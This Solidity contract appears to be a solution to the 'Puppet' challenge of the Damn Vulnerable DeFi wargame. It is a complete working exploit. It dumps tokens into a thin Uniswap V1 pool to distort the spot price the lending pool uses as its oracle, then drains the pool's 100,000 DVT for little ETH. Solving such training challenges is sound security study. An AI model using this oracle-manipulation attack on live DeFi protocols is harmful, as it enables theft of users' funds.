pragma solidity =0.8.25;

import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ExploitContract {
    event Balance(uint256, uint256);

    PuppetPool public immutable lendingPool;
    IUniswapV1Exchange public immutable uniswapV1Exchange;
    DamnValuableToken public immutable token;
    address public immutable recovery;

    constructor(PuppetPool _lendingPool, IUniswapV1Exchange _uniswapV1Exchange, DamnValuableToken _token, address _recovery) payable {
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        token = _token;
        recovery = _recovery;
    }

    function run() public {
        // Initial balances
        // - player: 25 ETH & 1000 DVT
        // - lending pool: 10^5 DVT
        // - exchange: 10 ETH & 10 DVT

        // I just want to buy 9 DVT
        token.approve(address(uniswapV1Exchange), type(uint256).max);
        uniswapV1Exchange.tokenToEthSwapOutput(9.9 ether, type(uint256).max, type(uint256).max);
        // player has 34.9 ETH & 7.02 DVT now

        uint256 tokenAmount = 100000 ether;
        uint256 ethAmount = lendingPool.calculateDepositRequired(tokenAmount);
        lendingPool.borrow{value: ethAmount}(tokenAmount, address(this));
        token.transfer(recovery, tokenAmount);
    }

    receive() external payable {}
}
